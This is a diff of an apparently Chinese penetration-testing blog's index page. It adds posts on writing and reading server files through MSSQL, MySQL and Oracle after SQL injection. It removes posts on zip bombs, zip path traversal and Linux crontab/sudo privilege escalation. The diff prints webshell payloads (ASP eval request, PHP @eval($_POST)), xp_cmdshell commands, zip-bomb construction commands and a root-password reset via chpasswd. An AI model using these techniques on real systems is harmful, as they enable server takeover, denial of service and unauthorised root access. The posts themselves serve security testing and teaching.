@@ -258,6 +258,358 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/10/数据库写入文件方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/10/数据库写入文件方式总结/" itemprop="url">
+                  数据库写入文件方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-10T00:32:55+08:00">
+                2020-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/10/数据库写入文件方式总结/" class="leancloud_visitors" data-flag-title="数据库写入文件方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过数据库写入文件是由sql注入获取webshell的常见手段，本文讨论远程连接数据库场景下的文件写入，对常用的mssql、mysql、oracle三种数据库的写入方式做总结。</p>
+<h2 id="mssql数据库写入文件"><a href="#mssql数据库写入文件" class="headerlink" title="mssql数据库写入文件"></a>mssql数据库写入文件</h2><h3 id="调用xp-cmdshell调用windows命令echo写入文件"><a href="#调用xp-cmdshell调用windows命令echo写入文件" class="headerlink" title="调用xp_cmdshell调用windows命令echo写入文件"></a>调用xp_cmdshell调用windows命令echo写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.xp..cmdshell &apos;echo &quot;cmdshell&quot; &gt; xxx.php&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用backup方法写入文件"><a href="#使用backup方法写入文件" class="headerlink" title="使用backup方法写入文件"></a>使用backup方法写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use model;</span><br><span class="line">create table cmd(str image);</span><br><span class="line">insert into cmd(str) values (&apos;&lt;%eval request(&quot;cmd&quot;)%&gt;&apos;);</span><br><span class="line">backup database model to disk=&apos;c:\TEMP\1.asp&apos;;</span><br></pre></td></tr></table></figure>
+<h2 id="mysql数据库写入文件"><a href="#mysql数据库写入文件" class="headerlink" title="mysql数据库写入文件"></a>mysql数据库写入文件</h2><h3 id="使用select-into-outfile写入文件"><a href="#使用select-into-outfile写入文件" class="headerlink" title="使用select into outfile写入文件"></a>使用select into outfile写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo(); ?&gt;&apos; into outfile &apos;c:/TEMP/outfile.php&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用select-into-dumpfile写入文件"><a href="#使用select-into-dumpfile写入文件" class="headerlink" title="使用select into dumpfile写入文件"></a>使用select into dumpfile写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos; into dumpfile &apos;c:/TEMP/dumpfile.php&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用mysql日志功能写入文件"><a href="#使用mysql日志功能写入文件" class="headerlink" title="使用mysql日志功能写入文件"></a>使用mysql日志功能写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general_log%&apos;;</span><br><span class="line">set global general_log_file=&quot;C://phpstudy_pro/WWW/sql_log.php&quot;;</span><br><span class="line">set global general_log=&quot;ON&quot;;</span><br><span class="line">SELECT &apos;&lt;?php @eval($_POST[&quot;123456&quot;]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<h2 id="oracle数据库写入文件"><a href="#oracle数据库写入文件" class="headerlink" title="oracle数据库写入文件"></a>oracle数据库写入文件</h2><h3 id="使用utl-file-方式写入文件"><a href="#使用utl-file-方式写入文件" class="headerlink" title="使用utl_file()方式写入文件"></a>使用utl_file()方式写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create or replace directory user_dir as &apos;C:\TEMP\oracle_dir&apos;;</span><br><span class="line">grant read on directory user_dir to public;</span><br><span class="line">grant write on directory user_dir to public;</span><br><span class="line">select * from dba_directories;</span><br><span class="line"></span><br><span class="line">declare</span><br><span class="line">F1 utl_file.file_type;</span><br><span class="line">begin</span><br><span class="line">F1:=utl_file.fopen(&apos;USER_DIR&apos;,&apos;01.txt&apos;,&apos;w&apos;);</span><br><span class="line">utl_file.put_line(F1,&apos;test&apos;);</span><br><span class="line">utl_file.fflush(F1);</span><br><span class="line">utl_file.fclose(F1);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/10/数据库读取文件方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/10/数据库读取文件方式总结/" itemprop="url">
+                  数据库读取文件方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-10T00:15:34+08:00">
+                2020-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/10/数据库读取文件方式总结/" class="leancloud_visitors" data-flag-title="数据库读取文件方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们找到一个sql注入漏洞时，首先能做的是将数据库的信息全部拖库，然后就会尝试使用数据库来获取更多的权限和资产，通过数据库读取服务器内文件是其中一种方式，本文仅讨论远程连接数据库场景下的文件读取，对常用的mssql、mysql、oracle三种数据库的读取方式做总结。</p>
+<h2 id="mssql数据库读取文件"><a href="#mssql数据库读取文件" class="headerlink" title="mssql数据库读取文件"></a>mssql数据库读取文件</h2><h3 id="调用xp-cmdshell调用windows命令type读取文件"><a href="#调用xp-cmdshell调用windows命令type读取文件" class="headerlink" title="调用xp_cmdshell调用windows命令type读取文件"></a>调用xp_cmdshell调用windows命令type读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.xp..cmdshell &apos;type c:\windows\system.ini&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="mysql数据库读取文件"><a href="#mysql数据库读取文件" class="headerlink" title="mysql数据库读取文件"></a>mysql数据库读取文件</h2><h3 id="使用load-file-方法读取文件"><a href="#使用load-file-方法读取文件" class="headerlink" title="使用load_file()方法读取文件"></a>使用load_file()方法读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:\windows\system.ini&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="使用load-file-infile-方法读取文件"><a href="#使用load-file-infile-方法读取文件" class="headerlink" title="使用load file infile()方法读取文件"></a>使用load file infile()方法读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table user(cmd text);</span><br><span class="line">load data infile &apos;c:/TEMP/text1.txt&apos; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure>
+<h2 id="oracle数据库读取文件"><a href="#oracle数据库读取文件" class="headerlink" title="oracle数据库读取文件"></a>oracle数据库读取文件</h2><h3 id="使用utl-file-方式读取文件"><a href="#使用utl-file-方式读取文件" class="headerlink" title="使用utl_file()方式读取文件"></a>使用utl_file()方式读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">create or replace directory user_dir as &apos;C:\TEMP\oracle_dir&apos;;</span><br><span class="line">grant read on directory user_dir to public;</span><br><span class="line">grant write on directory user_dir to public;</span><br><span class="line">select * from dba_directories;</span><br><span class="line"></span><br><span class="line">declare</span><br><span class="line">F1 utl_file.file_type;</span><br><span class="line">V1 varchar2(32767);</span><br><span class="line">begin</span><br><span class="line">F1:=utl_file.fopen(&apos;USER_DIR&apos;,&apos;02.txt&apos;,&apos;r&apos;);</span><br><span class="line">utl_file.get_line(F1,V1,30);</span><br><span class="line">utl_file.fclose(F1);</span><br><span class="line">dbms_output.put_line(V1);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/08/openssl加密反弹shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1868,423 +2220,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/zip炸弹和跨目录zip文件的构造/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/15/zip炸弹和跨目录zip文件的构造/" itemprop="url">
-                  zip炸弹和跨目录zip文件的构造
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T16:45:05+08:00">
-                2020-02-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/15/zip炸弹和跨目录zip文件的构造/" class="leancloud_visitors" data-flag-title="zip炸弹和跨目录zip文件的构造">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在对可上传zip文件的上传点进行测试时，除了一般的上传漏洞，我们也要关注其后台代码对zip文件解压后的大小和跨目录解压问题的检查。博主在本文中将介绍测试上述两种问题所用到的zip文件如何构造。</p>
-<h2 id="什么是zip炸弹"><a href="#什么是zip炸弹" class="headerlink" title="什么是zip炸弹"></a>什么是zip炸弹</h2><p>zip炸弹就是一个高压缩比的zip文件，它本身可能只有几M或几十M的大小，但是解压缩之后会产生巨大的数据量，会解压到几十G的大小甚至更大，这种zip文件会对解压缩的系统造成严重的资源负担，影响目标系统业务甚至达到使系统崩溃的结果。</p>
-<h2 id="可用于攻击何种系统"><a href="#可用于攻击何种系统" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>zip炸弹的危害主要在于它解压时消耗的资源和解压后占用的资源，所以主要会对未进行压缩文件解压后大小校验就直接解压的系统造成危害。</p>
-<h2 id="如何制作zip炸弹"><a href="#如何制作zip炸弹" class="headerlink" title="如何制作zip炸弹"></a>如何制作zip炸弹</h2><p>制作zip炸弹的方法非常简单，我们可以使用linux自带的命令制作。</p>
-<h3 id="1-制造一个较大的csv数据文件"><a href="#1-制造一个较大的csv数据文件" class="headerlink" title="1.制造一个较大的csv数据文件"></a>1.制造一个较大的csv数据文件</h3><p>如创建一个1G的csv数据文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=1024 of=bigFile.csv</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip01.png" alt=""></p>
-<p>我们也可以通过更改count的值和bs的值创建更大的csv数据文件<br>如10G的csv数据文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=10240 of=bigFile.csv</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-使用zip-9命令压缩"><a href="#2-使用zip-9命令压缩" class="headerlink" title="2.使用zip -9命令压缩"></a>2.使用zip -9命令压缩</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -9 bigFile.zip bigFile.csv</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip02.png" alt=""></p>
-<p>可以从图中看到，1G的csv文件被压缩到了1018K，我们将这个不到1M的zip文件上传，一般都能通过网站的上传文件大小限制，对自身上传时资源耗费很低，但是服务器解压过程中和解压之后占用的资源就比较多了。</p>
-<p>本文中用到的只是一个简单的例子，实际进攻时我们使用的zip文件解压后大小会更大，多达几十或上百TB级别，而且压缩比也会更高，压缩文件实际大小可能只有十几MB。会对服务器造成很严重的资源占用。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip03.png" alt=""></p>
-<p>我们使用这些超高压缩比的zip文件时也不需要自己构造，github中可以找到很多已经打包好的zip炸弹。</p>
-<h2 id="什么是zip跨目录"><a href="#什么是zip跨目录" class="headerlink" title="什么是zip跨目录"></a>什么是zip跨目录</h2><p>zip跨目录与我们常见的跨目录问题类似，都是使用../来进行相对路径的目录跨越，zip文件中携带含有../的文件，在解压过程中这些文件名被解析成相对路径，解压后就会将这些文件传递到其他目录。</p>
-<h2 id="可用于攻击何种系统-1"><a href="#可用于攻击何种系统-1" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>存在对zip文件解压的系统，程序实现代码未对携带的../等进行过滤，且解压时使用的解压程序没有跨目录的保护机制，这些文件才会被跨目录。</p>
-<p>linux中默认的unzip，即使正常使用解压了含有../的zip文件，也是不会被跨目录的，但是加入-:参数就会产生这种问题。所以这类问题大多数出现在程序的实现中，程序中调用了某些方法来进行文件解压，但是没有严格判断造成的。</p>
-<p>zip跨目录最典型的攻击手段用于存在上传后缀限制的web系统中，如某些接口仅允许上传压缩文件，上传后会自动解压，但是上传路径我们无法访问。这时候攻击者就会构造一个webshell文件并添加为携带目录信息的zip文件，被自动解压后就会将webshell解压到可访问目录，就会造成getshell。</p>
-<h2 id="如何制作跨目录zip文件"><a href="#如何制作跨目录zip文件" class="headerlink" title="如何制作跨目录zip文件"></a>如何制作跨目录zip文件</h2><p>制作跨目录zip文件的方式很方便，我们可以先制作好再上传，也可以在上传的过程中使用burpsuite改zip文件信息来构造。需要改的信息都是相同的。</p>
-<h3 id="1-使用notepad-修改"><a href="#1-使用notepad-修改" class="headerlink" title="1.使用notepad++修改"></a>1.使用notepad++修改</h3><p>首先我们需要创建一个文件名较长的文件，如1234567890.txt。</p>
-<p>然后将其压缩为zip格式。</p>
-<p>使用notepad++打开zip格式的文件，寻找两处很明显的1234567890.txt字段，修改成../../7890.txt，保存后重新打开zip文件就成功了。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip04.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip05.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip06.png" alt=""></p>
-<p>在修改的过程中要确保修改前的文件名和修改后的文件名长度一致，由于一个../就占了三个长度，所以在前面才需要文件名较长，文件名越长，可以跨越的目录层数越多。</p>
-<h3 id="2-使用burpsuite修改"><a href="#2-使用burpsuite修改" class="headerlink" title="2.使用burpsuite修改"></a>2.使用burpsuite修改</h3><p>上传过程中，使用burpsuite抓包，直接修改和notepad++中要修改的同样的两处字段提交即可。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/linux常见提权方式总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/12/linux常见提权方式总结/" itemprop="url">
-                  linux常见提权方式总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T23:00:00+08:00">
-                2020-02-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/提权/" itemprop="url" rel="index">
-                    <span itemprop="name">提权</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/12/linux常见提权方式总结/" class="leancloud_visitors" data-flag-title="linux常见提权方式总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。</p>
-<h2 id="1-crontab定时任务提权"><a href="#1-crontab定时任务提权" class="headerlink" title="1. crontab定时任务提权"></a>1. crontab定时任务提权</h2><p>crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。</p>
-<p>我们可以通过如下指令来编辑和查看当前工作表命令 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u username]　　　　//省略用户表表示操作当前用户的crontab</span><br><span class="line">    -e      (编辑工作表)</span><br><span class="line">    -l      (列出工作表里的命令)</span><br><span class="line">    -r      (删除工作表)</span><br></pre></td></tr></table></figure>
-<p>更多的crontab操作可以参考教程 <a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a> </p>
-<h3 id="1-1-root权限定时任务脚本普通用户可写"><a href="#1-1-root权限定时任务脚本普通用户可写" class="headerlink" title="1.1 root权限定时任务脚本普通用户可写"></a>1.1 root权限定时任务脚本普通用户可写</h3><p>以root权限执行的定时任务或其所在文件夹，低权限用户拥有写权限，则可进行提权。</p>
-<p>示例：</p>
-<p>切换到root用户，输入crontab -e，添加一个一分钟执行一次的shell脚本，然后赋予此脚本执行权限和其他用户可写权限。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /home/test/cron.sh</span><br></pre></td></tr></table></figure>
-<p>开启其他shell，切换到普通用户，修改脚本内容为重置root密码，或者添加此普通用户权限等操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; | chpasswd</span><br></pre></td></tr></table></figure>
-<p>然后su root使用更改后密码切换至root</p>
-<p>如果文件不可写而文件夹可写的情况，如下图情况，可以删除到整个路径，然后重新由普通用户创建路径和其中脚本，就变成可写的情况了。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png" alt=""></p>
-<h3 id="1-2-root权限定时任务调用的脚本普通用户可写"><a href="#1-2-root权限定时任务调用的脚本普通用户可写" class="headerlink" title="1.2 root权限定时任务调用的脚本普通用户可写"></a>1.2 root权限定时任务调用的脚本普通用户可写</h3><p>很多时候，定时任务并不是孤立存在的，它会去调用很多别的shell脚本来完成一些操作，而root权限的定时任务调用的脚本也会以root权限执行，所以我们仍需要关注其调用的其他脚本是否普通用户可写，如果可写，仍然可以提权。</p>
-<p>查询此类脚本的方法是首先找到root的定时任务 xxx.sh，然后在文件种查找其他shell脚本即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;*.sh&quot; xxx.sh</span><br></pre></td></tr></table></figure>
-<h2 id="2-sudo脚本提权"><a href="#2-sudo脚本提权" class="headerlink" title="2. sudo脚本提权"></a>2. sudo脚本提权</h2><p>sudo脚本提权，主要和/etc/sudoers配置文件有关，主要由以下三种配置引起：</p>
-<ul>
-<li><p>1.在sudoers文件中配置的脚本在运行时默认以root权限执行</p>
-</li>
-<li><p>2.在sudoers文件中配置的文件夹，内部所有脚本默认以root权限执行</p>
-</li>
-<li><p>3.在sudoers文件中配置的系统命令，默认以root权限执行</p>
-</li>
-</ul>
-<p>而这三种配置就引出了三种提权方式，在这里作者分别配置了，/home/test/sudotest.sh文件，/home/test/sudo文件夹，以及zip,tar,more三个命令，分别对应了上述三种情况</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo02.png" alt=""></p>
-<h3 id="2-1-sudoers文件中配置的脚本文件"><a href="#2-1-sudoers文件中配置的脚本文件" class="headerlink" title="2.1 sudoers文件中配置的脚本文件"></a>2.1 sudoers文件中配置的脚本文件</h3><p>/etc/sudoers中配置的sudo脚本文件低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
-<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/test</span><br><span class="line">echo &quot;bin/bash&quot; &gt; sudotest.sh</span><br><span class="line">chmod +x sudotest.sh</span><br><span class="line">sudo ./sudotest.sh</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo03.png" alt=""></p>
-<h3 id="2-2-sudoers文件中配置的文件夹"><a href="#2-2-sudoers文件中配置的文件夹" class="headerlink" title="2.2 sudoers文件中配置的文件夹"></a>2.2 sudoers文件中配置的文件夹</h3><p>/etc/sudoers中配置的sudo文件夹低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
-<p>在之前的配置中我们可以看到，在/home/test/sudo这个test用户可控目录以test随意创建脚本使用sudo执行均是免root密码的。</p>
